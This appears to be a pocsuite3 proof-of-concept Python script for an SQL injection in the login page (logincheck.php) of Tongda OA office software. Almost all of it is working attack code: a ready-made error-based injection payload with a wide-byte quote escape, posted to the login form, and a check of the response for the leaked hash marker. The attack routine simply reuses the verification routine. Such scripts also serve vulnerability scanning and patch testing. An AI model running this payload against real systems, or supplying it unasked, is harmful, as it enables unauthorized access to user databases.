#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''通达OA_logincheck_sqli'''
    desc = ''''''
    solution = ''''''
    severity = '''high'''
    vulType = '''sql-inj'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''通达 OA'''
    appVersion = '''all'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url, ip, port = parse_ip_port(self.target, 80)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        verify_url = make_verify_url(self.url, "/logincheck.php", mod=0)
        payload = "submit=%b5%c7%20%c2%bc&PASSWORD=111&UNAME=%df%27%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(0x3a,md5(123456),0x3a)%20from%20user%20limit%201),floor(rand(0)*2))x%20from%20%20information_schema.tables%20group%20by%20x)a)%23"
        response = requests.post(verify_url, data=payload, timeout=15, headers=headers, verify=False)
        if response.status_code == 200 and b"e10adc3949ba59abbe56e057f20f883e" in response.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = verify_url
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
